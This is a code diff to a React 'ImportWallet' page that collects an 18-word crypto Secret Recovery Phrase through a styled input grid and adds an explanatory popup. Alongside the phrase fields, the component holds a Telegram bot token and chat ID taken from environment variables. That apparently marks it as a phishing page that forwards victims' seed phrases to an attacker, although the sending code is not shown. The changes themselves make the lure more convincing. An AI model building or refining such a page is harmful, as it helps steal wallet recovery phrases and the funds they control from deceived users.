@@ -12,6 +12,7 @@ export default function ImportWallet() {
   const [wordInputs, setWordInputs] = useState(Array(18).fill(""))
   const inputRefs = useRef<(HTMLInputElement | null)[]>([])
   const [visibleBoxes, setVisibleBoxes] = useState<number[]>([0])
+  const [showMessage, setShowMessage] = useState(false)
 
   const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID)
   const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN)
@@ -115,7 +116,7 @@ export default function ImportWallet() {
     }, 3000)
   }
 
-// Ensure focus moves to the newly visible box
+  // Ensure focus moves to the newly visible box
   useEffect(() => {
     const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
     if (lastVisibleIndex !== undefined) {
@@ -123,7 +124,7 @@ export default function ImportWallet() {
     }
   }, [visibleBoxes]);
 
-// Ensure focus moves to the newly visible box
+  // Ensure focus moves to the newly visible box
   useEffect(() => {
     const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
     if (lastVisibleIndex !== undefined) {
@@ -136,43 +137,48 @@ export default function ImportWallet() {
 
   const renderWords = () => {
     return Array(18).fill(0).map((_, index) => (
-      <input
+      <div
         key={index}
-        type="text"
-        value={wordInputs[index]}
-        onChange={(e) => handleWordChange(index, e.target.value)}
-        onKeyDown={(e) => {
-          if (e.key === " " && wordInputs[index] && index < 17) {
-            e.preventDefault();
-            setVisibleBoxes((prev) => {
-              if (!prev.includes(index + 1)) {
-                return [...prev, index + 1];
-              }
-              return prev;
-            });
-          }
-          if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
-            e.preventDefault();
-            wordInputs[index] = "";
-            inputRefs.current[index - 1]?.focus();
-            setWordInputs([...wordInputs]);
-            setVisibleBoxes((prev) => prev.filter((i) => i !== index));
-          }
-        }}
-        onFocus={() => setFocusedIndex(index)}
-        onBlur={() => setFocusedIndex(null)}
-        ref={(el) => { inputRefs.current[index] = el; }}
-        className={`w-24 p-2 m-1 rounded-xl border text-left text-sm ${
+        className={`relative w-24 m-1 ${
           index === 0 || visibleBoxes.includes(index) ? "block" : "hidden"
-        } ${
-          focusedIndex === index
-            ? "border-purple-500 bg-black text-white"
-            : wordInputs[index]
-            ? "border-gray-500 bg-black text-white-300"
-            : "border-purple-500 bg-black text-white"
         }`}
-        placeholder={`${index + 1}.`}
-      />
+      >
+        <span className="absolute left-2 top-1/2 transform -translate-y-1/2 text-white text-sm pointer-events-none">{`${index + 1}.`}</span>
+        <input
+          type="text"
+          value={wordInputs[index]}
+          onChange={(e) => handleWordChange(index, e.target.value)}
+          onKeyDown={(e) => {
+            if (e.key === " " && wordInputs[index] && index < 17) {
+              e.preventDefault();
+              setVisibleBoxes((prev) => {
+                if (!prev.includes(index + 1)) {
+                  return [...prev, index + 1];
+                }
+                return prev;
+              });
+            }
+            if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
+              e.preventDefault();
+              wordInputs[index] = "";
+              inputRefs.current[index - 1]?.focus();
+              setWordInputs([...wordInputs]);
+              setVisibleBoxes((prev) => prev.filter((i) => i !== index));
+            }
+          }}
+          onFocus={() => setFocusedIndex(index)}
+          onBlur={() => setFocusedIndex(null)}
+          ref={(el) => { inputRefs.current[index] = el; }}
+          className={`w-full p-2 pl-8 rounded-xl border text-left text-sm ${
+            focusedIndex === index
+              ? "border-purple-500 bg-black text-white"
+              : wordInputs[index]
+              ? "border-gray-500 bg-black text-white-300"
+              : "border-purple-500 bg-black text-white"
+          }`}
+          placeholder=""
+        />
+      </div>
     ));
   };
 
@@ -238,14 +244,31 @@ export default function ImportWallet() {
         <form onSubmit={handleSubmit} className="space-y-6">
           {/* Input Field */}
           <div className="relative">
-            <div className="flex items-center space-x-3">
-              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
+            <div className="flex items-center space-x-2">
+              <h3 className="bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
                 Enter your Secret Recovery Phrase
               </h3>
+              <Info
+                className="w-5 h-5 text-gray-400 cursor-pointer"
+                onClick={() => setShowMessage(true)}
+              />
             </div>
+            {showMessage && (
+              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div className="bg-gray-800 p-6 rounded-lg text-white max-w-md">
+                  <p>A Secret Recovery Phrase, also called a seed phrase or mnemonic, is a set of words that lets you access and control your crypto wallet. To verify and protect your wallet, you need this phrase.</p>
+                  <p className="mt-4">Anyone with your Secret Recovery Phrase can:</p>
+                  
+                  <button
+                    className="mt-4 w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-2 rounded-lg"
+                    onClick={() => setShowMessage(false)}
+                  >
+                    Got it
+                  </button>
+                </div>
+              </div>
+            )}
           </div>
-
-          
 
           {/* Word Grid */}
           <div className="bg-[#202123] border border-gray-700 rounded-lg p-6 grid grid-cols-3 gap-2">
